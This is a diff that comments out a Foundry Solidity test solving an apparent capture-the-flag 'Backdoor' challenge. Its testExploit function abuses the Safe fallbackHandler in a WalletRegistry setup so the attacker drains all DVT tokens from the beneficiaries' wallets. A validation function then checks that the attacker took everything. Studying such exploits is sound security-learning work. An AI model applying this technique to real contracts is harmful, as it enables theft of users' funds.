@@ -1,158 +1,158 @@
-// SPDX-License-Identifier: MIT
-pragma solidity 0.8.21;
+// // SPDX-License-Identifier: MIT
+// pragma solidity 0.8.21;
 
-import "forge-std/Test.sol";
-import {Utilities} from "./Utilities.sol";
-import {MockERC20} from "../mocks/MockERC20.sol";
-import {WalletRegistry} from "../../src/Week17-18/Backdoor/WalletRegistry.sol";
-import {Safe} from "@gnosis/contracts/Safe.sol";
-import {SafeProxy} from "@gnosis/contracts/proxies/SafeProxy.sol";
-import {SafeProxyFactory} from "@gnosis/contracts/proxies/SafeProxyFactory.sol";
+// import "forge-std/Test.sol";
+// import {Utilities} from "./Utilities.sol";
+// import {MockERC20} from "../mocks/MockERC20.sol";
+// import {WalletRegistry} from "../../src/Week17-18/Backdoor/WalletRegistry.sol";
+// import {Safe} from "@gnosis/contracts/Safe.sol";
+// import {SafeProxy} from "@gnosis/contracts/proxies/SafeProxy.sol";
+// import {SafeProxyFactory} from "@gnosis/contracts/proxies/SafeProxyFactory.sol";
 
-//forge test --mc BackdoorTest -vvvv --via-ir
-contract BackdoorTest is Test {
-    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
-    uint256 internal constant NUM_USERS = 4;
+// //forge test --mc BackdoorTest -vvvv --via-ir
+// contract BackdoorTest is Test {
+//     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
+//     uint256 internal constant NUM_USERS = 4;
     
-    Utilities internal utils;
-    MockERC20 internal dvt;
-    Safe internal masterCopy;
-    SafeProxyFactory internal walletFactory;
-    WalletRegistry internal walletRegistry;
+//     Utilities internal utils;
+//     MockERC20 internal dvt;
+//     Safe internal masterCopy;
+//     SafeProxyFactory internal walletFactory;
+//     WalletRegistry internal walletRegistry;
 
-    address[] internal users;
-    address payable internal attacker;
-    address internal alice;
-    address internal bob;
-    address internal charlie;
-    address internal david;
+//     address[] internal users;
+//     address payable internal attacker;
+//     address internal alice;
+//     address internal bob;
+//     address internal charlie;
+//     address internal david;
 
-    address[] beneficiaries;
+//     address[] beneficiaries;
 
-    function setUp() public {
-        /**
-         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
-        */
+//     function setUp() public {
+//         /**
+//          * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
+//         */
 
-        utils = new Utilities();
-        users = utils.createUsers(NUM_USERS);
+//         utils = new Utilities();
+//         users = utils.createUsers(NUM_USERS);
 
-        alice = users[0];
-        bob = users[1];
-        charlie = users[2];
-        david = users[3];
+//         alice = users[0];
+//         bob = users[1];
+//         charlie = users[2];
+//         david = users[3];
 
-        vm.label(alice, "Alice");
-        vm.label(bob, "Bob");
-        vm.label(charlie, "Charlie");
-        vm.label(david, "David");
+//         vm.label(alice, "Alice");
+//         vm.label(bob, "Bob");
+//         vm.label(charlie, "Charlie");
+//         vm.label(david, "David");
 
-        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
-        vm.label(attacker, "Attacker");
+//         attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
+//         vm.label(attacker, "Attacker");
 
-        // Deploy Gnosis Safe masterCopy and factory contracts
-        masterCopy = new Safe();
-        vm.label(address(masterCopy), "Gnosis Safe");
+//         // Deploy Gnosis Safe masterCopy and factory contracts
+//         masterCopy = new Safe();
+//         vm.label(address(masterCopy), "Gnosis Safe");
 
-        walletFactory = new SafeProxyFactory();
-        vm.label(address(walletFactory), "Wallet Factory");
+//         walletFactory = new SafeProxyFactory();
+//         vm.label(address(walletFactory), "Wallet Factory");
 
-        dvt = new MockERC20();
-        vm.label(address(dvt), "DVT");
+//         dvt = new MockERC20();
+//         vm.label(address(dvt), "DVT");
 
-        // Deploy the registry
-        walletRegistry = new WalletRegistry(
-            address(masterCopy),
-            address(walletFactory),
-            address(dvt),
-            users
-        );
+//         // Deploy the registry
+//         walletRegistry = new WalletRegistry(
+//             address(masterCopy),
+//             address(walletFactory),
+//             address(dvt),
+//             users
+//         );
         
-        // Users are registered as beneficiaries
-        for (uint256 i = 0; i < NUM_USERS; i++) {
-            assertTrue(walletRegistry.beneficiaries(users[i]));
-        }
+//         // Users are registered as beneficiaries
+//         for (uint256 i = 0; i < NUM_USERS; i++) {
+//             assertTrue(walletRegistry.beneficiaries(users[i]));
+//         }
 
-        // Transfer tokens to the registry so they can be distributed to the `Safe` wallet
-        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
+//         // Transfer tokens to the registry so they can be distributed to the `Safe` wallet
+//         dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
 
-        console.log(unicode"🧨 Let's see if you can break it... 🧨");
-    }
+//         console.log(unicode"🧨 Let's see if you can break it... 🧨");
+//     }
 
-    function testExploit() public {
-        /**
-         * EXPLOIT START *
-        */
-        beneficiaries.push(alice);
-        beneficiaries.push(bob);
-        beneficiaries.push(charlie);
-        beneficiaries.push(david);
-        address[] memory _owners = new address[](1);
+//     function testExploit() public {
+//         /**
+//          * EXPLOIT START *
+//         */
+//         beneficiaries.push(alice);
+//         beneficiaries.push(bob);
+//         beneficiaries.push(charlie);
+//         beneficiaries.push(david);
+//         address[] memory _owners = new address[](1);
 
-        for (uint256 i = 0; i < beneficiaries.length; i++) {
-            //Each beneficary needs to create a `Safe` wallet. In `setup` for `Safe`, the `_owners` param takes an array.
-            _owners[0] = beneficiaries[i];
+//         for (uint256 i = 0; i < beneficiaries.length; i++) {
+//             //Each beneficary needs to create a `Safe` wallet. In `setup` for `Safe`, the `_owners` param takes an array.
+//             _owners[0] = beneficiaries[i];
 
-            //Construct initializer calldata for `createProxyWithCallback`
-            //Pass in the address of the token as the `fallbackHandler` in the `setup` function
-            //so that we can execute our exploit and execute calls to the token contract by forwarding
-            //fallback calls to the token contract through the `Safe` wallet.
-            bytes memory initializer = abi.encodeWithSignature(
-                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
-                _owners,       //_owners: `Safe` owners
-                1,             //_threshold: Number of required confirmations for a Safe transaction
-                address(0),    //to: Address for optional delegate call
-                "",            //data: Data payload for optional delegate call
-                address(dvt),  //fallbackHandler: Handles fallback calls to the Safe wallet
-                address(0),    //paymentToken: Token to be used for the payment (0 == ETH)
-                0,             //payment: Amount that should be paid
-                address(0)     //paymentReceiver: Address that should receive the payment
-            );
+//             //Construct initializer calldata for `createProxyWithCallback`
+//             //Pass in the address of the token as the `fallbackHandler` in the `setup` function
+//             //so that we can execute our exploit and execute calls to the token contract by forwarding
+//             //fallback calls to the token contract through the `Safe` wallet.
+//             bytes memory initializer = abi.encodeWithSignature(
+//                 "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+//                 _owners,       //_owners: `Safe` owners
+//                 1,             //_threshold: Number of required confirmations for a Safe transaction
+//                 address(0),    //to: Address for optional delegate call
+//                 "",            //data: Data payload for optional delegate call
+//                 address(dvt),  //fallbackHandler: Handles fallback calls to the Safe wallet
+//                 address(0),    //paymentToken: Token to be used for the payment (0 == ETH)
+//                 0,             //payment: Amount that should be paid
+//                 address(0)     //paymentReceiver: Address that should receive the payment
+//             );
 
-            //Create a wallet through the factory, which sets up the `SafeProxy` linked to a `Safe` wallet implementation
-            //and then calls the `proxyCreated` callback in the registry.
-            SafeProxy proxy = walletFactory.createProxyWithCallback(
-                address(masterCopy), //singleton
-                initializer,         //initializer: payload for a message call to be sent to the new proxy contract.
-                1,                   //saltNonce: used to generate the salt to calc the address of the new proxy contract. 
-                walletRegistry       //callback: Address containing the callback that will be invoked
-            );
+//             //Create a wallet through the factory, which sets up the `SafeProxy` linked to a `Safe` wallet implementation
+//             //and then calls the `proxyCreated` callback in the registry.
+//             SafeProxy proxy = walletFactory.createProxyWithCallback(
+//                 address(masterCopy), //singleton
+//                 initializer,         //initializer: payload for a message call to be sent to the new proxy contract.
+//                 1,                   //saltNonce: used to generate the salt to calc the address of the new proxy contract. 
+//                 walletRegistry       //callback: Address containing the callback that will be invoked
+//             );
             
-            //Exploit through the fallback
-            vm.prank(attacker);
-            address(proxy).call(
-                abi.encodeWithSignature("transfer(address,uint256)", attacker, AMOUNT_TOKENS_DISTRIBUTED / 4)
-            );
-        }
-        /**
-         * EXPLOIT END *
-        */
+//             //Exploit through the fallback
+//             vm.prank(attacker);
+//             address(proxy).call(
+//                 abi.encodeWithSignature("transfer(address,uint256)", attacker, AMOUNT_TOKENS_DISTRIBUTED / 4)
+//             );
+//         }
+//         /**
+//          * EXPLOIT END *
+//         */
 
-        validation();
-        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
-    }
+//         validation();
+//         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+//     }
 
-    function validation() internal {
-        /**
-         * SUCCESS CONDITIONS
-         */
-        for (uint256 i = 0; i < NUM_USERS; i++) {
-            address wallet = walletRegistry.wallets(users[i]);
+//     function validation() internal {
+//         /**
+//          * SUCCESS CONDITIONS
+//          */
+//         for (uint256 i = 0; i < NUM_USERS; i++) {
+//             address wallet = walletRegistry.wallets(users[i]);
 
-            // User must have registered a wallet
-            if (wallet == address(0)) {
-                emit log("User did not register a wallet");
-                fail();
-            }
+//             // User must have registered a wallet
+//             if (wallet == address(0)) {
+//                 emit log("User did not register a wallet");
+//                 fail();
+//             }
 
-            // User is no longer registered as a beneficiary
-            assertTrue(!walletRegistry.beneficiaries(users[i]));
-        }
+//             // User is no longer registered as a beneficiary
+//             assertTrue(!walletRegistry.beneficiaries(users[i]));
+//         }
 
-        // Attacker must have taken all tokens
-        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
-    }
-}
+//         // Attacker must have taken all tokens
+//         assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
+//     }
+// }
 
 /// High level overview of how Gnosis safe contracts work: Safe.sol, SafeProxy.sol, SafeProxyFactory.sol:
 /// 1. Safe.sol: The main contract that implements the logic for the Gnosis Safe wallet.
